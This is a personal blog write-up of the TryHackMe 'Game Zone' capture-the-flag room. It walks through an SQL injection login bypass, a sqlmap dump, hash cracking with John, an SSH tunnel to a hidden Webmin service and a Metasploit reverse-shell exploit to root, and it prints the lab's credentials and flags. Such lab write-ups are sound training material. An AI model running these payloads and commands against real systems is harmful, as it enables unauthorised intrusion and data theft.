@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Game Zone | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: SQLi login bypass, SQLMap dump, John the Ripper hash crack, reverse SSH tunnel to expose Webmin, Metasploit privesc to root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/game-zone.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/game-zone.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Game Zone">
+<meta property="og:description" content="TryHackMe CTF: SQLi login bypass, SQLMap dump, John the Ripper hash crack, reverse SSH tunnel to expose Webmin, Metasploit privesc to root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Game Zone">
+<meta name="twitter:description" content="TryHackMe CTF: SQLi login bypass, SQLMap dump, John the Ripper hash crack, reverse SSH tunnel to expose Webmin, Metasploit privesc to root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Game Zone</h1>
+    <div class="post-description">TryHackMe CTF. SQLi, password cracking, a reverse SSH tunnel to expose a hidden service, and a Metasploit payload to root. Let the games begin.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>SQLi, password cracking, a reverse SSH tunnel to expose a hidden service, and a Metasploit payload to root. Let the games begin.</p>
+
+<p>I&rsquo;m not much of a gamer. I had the potential, but I put down a Nintendo controller in the mid 90s after noticing that losing to my younger sister created levels of anger I didn&rsquo;t feel elsewhere. I channel those emotions in healthier ways now, like keeping adversaries out of systems by breaking them myself.</p>
+
+<p>It&rsquo;s not a competition. It never has been. We all lose in the face of anger, jealousy, and weakness.</p>
+
+<hr>
+
+<h2>Recon</h2>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV -p- -T4 -A TARGET_IP -oN game_zone_result.txt</code></pre>
+
+<p>One of my favorite findings right up top: <code>PHPSESSID: httponly flag not set</code>.</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 6.13.37 AM.png" alt="nmap scan results with PHPSESSID httponly flag not set highlighted" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;ll keep that in our back pocket for once we&rsquo;re inside.</p>
+
+<p>In-browser, the target is a gaming forum. This is where not being a gamer might muddle things, so I&rsquo;ll trust a search engine on the avatar question.</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 6.17.59 AM.png" alt="Game Zone homepage showing the large cartoon sniper avatar" style="max-width:100%;margin:2rem 0;">
+
+<p>The large cartoon avatar holding a sniper is <strong>Agent 47</strong>. Thank you, Goog.</p>
+
+<hr>
+
+<h2>Access via SQLi</h2>
+
+<p>The goal: authenticated access via SQLi on the login form. A password will break even a well-crafted injection, so we leave that field blank and feed the username field:</p>
+
+<pre><code>' or 1=1 -- -</code></pre>
+
+<p>Breaking it down:</p>
+
+<pre><code>'        closes the username string
+or 1=1   adds a condition that is always true
+-- -     comments out the rest of the query</code></pre>
+
+<p>What the database actually sees:</p>
+
+<pre><code class="language-sql">WHERE username = '' OR true</code></pre>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 6.33.28 AM.png" alt="login form with SQLi payload entered in the username field" style="max-width:100%;margin:2rem 0;">
+
+<p>One click, and we&rsquo;re in. Redirected to <code>portal.php</code>.</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 6.34.05 AM.png" alt="portal.php loaded after successful SQLi bypass" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>SQLMap</h2>
+
+<p>On <code>/portal.php</code>, fire up Burp and intercept a search request. FoxyProxy and Intercept both on, grab the request.</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 6.39.23 AM.png" alt="Burp Suite intercepting the portal.php search request" style="max-width:100%;margin:2rem 0;">
+
+<p>Copy the raw request from Burp into a .txt file. Know exactly where you saved it and what it&rsquo;s called.</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 6.41.48 AM.png" alt="raw Burp request saved to gamezone_request.txt" style="max-width:100%;margin:2rem 0;">
+
+<p>Then point SQLMap at it:</p>
+
+<pre><code class="language-bash">sqlmap -r gamezone_request.txt --dbms=mysql --dump</code></pre>
+
+<pre><code>-r        use a saved request file
+--dbms    the database type we're up against
+--dump    dump the entire contents</code></pre>
+
+<p>Answer yes to the prompts and let it work. This is my favorite part. The spinner is a verifiable CLI work of art.</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 6.52.42 AM.png" alt="SQLMap running and enumerating the database" style="max-width:100%;margin:2rem 0;">
+
+<p>And there it is. Thank you, SQLMap, you did the heavy lifting.</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 6.54.53 AM.png" alt="SQLMap dump showing agent47 username and SHA-256 password hash" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>| pwd                                                              | username |
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |</code></pre>
+
+<p>Hashed password for <code>agent47</code>. For the other table, a quick follow-up:</p>
+
+<pre><code class="language-bash">sqlmap -r gamezone_request.txt -D db --tables</code></pre>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 7.13.02 AM.png" alt="SQLMap listing tables in the db database" style="max-width:100%;margin:2rem 0;">
+
+<p>The other table is <code>post</code>.</p>
+
+<hr>
+
+<h2>Cracking with John</h2>
+
+<p>Let&rsquo;s de-hash with John. Mr. Ripper, if you prefer formalities. Wordlist of choice: rockyou.</p>
+
+<pre><code class="language-bash">john gamezone_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256</code></pre>
+
+<p>Drop the hash into <code>gamezone_hash.txt</code> first if you haven&rsquo;t, then run it.</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 7.25.10 AM.png" alt="John the Ripper cracking the hash and returning videogamer124" style="max-width:100%;margin:2rem 0;">
+
+<p>De-hashed password: <code>videogamer124</code></p>
+
+<p>For a supposed agent, his cyber posture is incredibly weak. SSH in:</p>
+
+<pre><code class="language-bash">ssh agent47@TARGET_IP</code></pre>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 7.28.39 AM.png" alt="SSH login as agent47 with password videogamer124" style="max-width:100%;margin:2rem 0;">
+
+<p>At least it&rsquo;s easy to type blindly.</p>
+
+<pre><code class="language-bash">cat user.txt</code></pre>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 7.30.17 AM.png" alt="user.txt flag on agent47's home directory" style="max-width:100%;margin:2rem 0;">
+
+<p>User flag: <code>649ac17b1480ac13ef1e4fa579dac95c</code></p>
+
+<hr>
+
+<h2>Exposing a hidden service with a reverse SSH tunnel</h2>
+
+<p>Reverse SSH tunnels are pretty darn cool. Without the verbose explanation: it works a bit like URL forwarding, but with ports and servers.</p>
+
+<p>The goal now is to reach port 10000 and find an exposed CMS. As agent47:</p>
+
+<pre><code class="language-bash">ss -tulpn</code></pre>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 7.35.15 AM.png" alt="ss -tulpn output showing MariaDB on 3306 and port 10000 listening on all interfaces" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>-t  tcp sockets
+-u  udp sockets
+-l  listening sockets
+-p  process using the socket
+-n  don't resolve names</code></pre>
+
+<p>I used this exact tool on my home lab the other day to find out why port 111 was open and what it was serving (rpcbind). Given that I&rsquo;d just exploited rpcbind a few days prior, that was not staying open. (More on that when the home lab page goes up.)</p>
+
+<p>Back on track. In the output, <code>127.0.0.1:3306</code> is localhost-bound MariaDB. Port 10000 is listening on all interfaces (<code>*:10000</code>). Smells like Webmin, but always verify.</p>
+
+<p>agent47 has no nmap installed, so verify from your own box:</p>
+
+<pre><code class="language-bash">nmap -sV -p10000 TARGET_IP</code></pre>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 7.50.13 AM.png" alt="nmap confirming port 10000 filtered by firewall from the outside" style="max-width:100%;margin:2rem 0;">
+
+<p>A firewall rule blocks us from hitting 10000 directly. Tunnel through it:</p>
+
+<pre><code class="language-bash">ssh -L 10000:localhost:10000 agent47@TARGET_IP</code></pre>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 7.55.11 AM.png" alt="SSH local port forward tunnel established as agent47" style="max-width:100%;margin:2rem 0;">
+
+<p>Now visit <code>localhost:10000</code> in-browser.</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 7.56.36 AM.png" alt="Webmin login page at localhost:10000 via the tunnel" style="max-width:100%;margin:2rem 0;">
+
+<p>The exposed CMS is <strong>Webmin</strong>. Credentials <code>agent47:videogamer124</code> work here too. That means this supposed agent has a customer base. I really shouldn&rsquo;t be surprised.</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 7.58.52 AM.png" alt="Webmin dashboard logged in as agent47, version 1.580 visible" style="max-width:100%;margin:2rem 0;">
+
+<p>Version <code>1.580</code>.</p>
+
+<hr>
+
+<h2>Privesc with Metasploit</h2>
+
+<p>My most-anticipated part. Open a fresh terminal, leave the two agent47 SSH consoles running, they won&rsquo;t bite.</p>
+
+<pre><code class="language-bash">msfconsole
+search webmin 1.580
+use 0
+show options</code></pre>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 8.06.19 AM.png" alt="Metasploit webmin 1.580 module loaded with options displayed" style="max-width:100%;margin:2rem 0;">
+
+<p>Set it up:</p>
+
+<pre><code class="language-bash">set USERNAME agent47
+set PASSWORD videogamer124
+set RHOSTS 127.0.0.1
+set LHOST ATTACKER_IP
+set LPORT 4444
+show options</code></pre>
+
+<p>Run <code>check</code>:</p>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 8.11.19 AM.png" alt="Metasploit check failing because SSL is set to true but the service is HTTP" style="max-width:100%;margin:2rem 0;">
+
+<p>This is why we always verify. The exploit would have run over HTTPS, but we need HTTP. Easy fix:</p>
+
+<pre><code class="language-bash">set SSL false
+check</code></pre>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 8.12.21 AM.png" alt="Metasploit check returning target is vulnerable after SSL set to false" style="max-width:100%;margin:2rem 0;">
+
+<p>Cleared for takeoff. Make sure the localhost tunnel is still open, then <code>run</code>.</p>
+
+<p>Metasploit lied to us the first time, so set the payload explicitly:</p>
+
+<pre><code class="language-bash">set PAYLOAD cmd/unix/reverse
+run</code></pre>
+
+<img src="/images/game-zone/Screenshot 2026-06-04 at 8.18.27 AM.png" alt="Metasploit exploit firing and dropping a root shell" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">cd /root
+cat root.txt</code></pre>
+
+<p>Root flag: <code>a4b945830144bdd71908d12d902adeee</code></p>
+
+<p>This one was very fun. I love when I catch the confetti.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code class="language-bash"># 1. Recon
+nmap -sS -Pn -sC -sV -p- -T4 -A TARGET_IP -oN game_zone_result.txt
+# Web forum. PHPSESSID httponly not set.
+
+# 2. SQLi login bypass (username field, password blank)
+' or 1=1 -- -
+# -> authenticated, redirected to portal.php
+
+# 3. SQLMap dump via intercepted Burp request
+sqlmap -r gamezone_request.txt --dbms=mysql --dump
+# agent47 : ab5db915...3efd14 (SHA-256)
+
+# 4. Crack with John
+john gamezone_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+# videogamer124
+
+# 5. SSH in -> user flag
+ssh agent47@TARGET_IP
+cat user.txt
+
+# 6. Find hidden Webmin on 10000, tunnel past the firewall
+ss -tulpn                       # *:10000 listening
+ssh -L 10000:localhost:10000 agent47@TARGET_IP
+# browse localhost:10000 -> Webmin 1.580, agent47:videogamer124
+
+# 7. Privesc with Metasploit
+msfconsole
+use exploit/unix/webapp/webmin_show_cgi_exec
+set USERNAME agent47
+set PASSWORD videogamer124
+set RHOSTS 127.0.0.1
+set LHOST ATTACKER_IP
+set SSL false
+set PAYLOAD cmd/unix/reverse
+run                             # root -> root.txt</code></pre>
+
+<p>Recap: SQLi login bypass, SQLMap dump, John crack, SSH, reverse SSH tunnel to expose Webmin, Metasploit to root.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
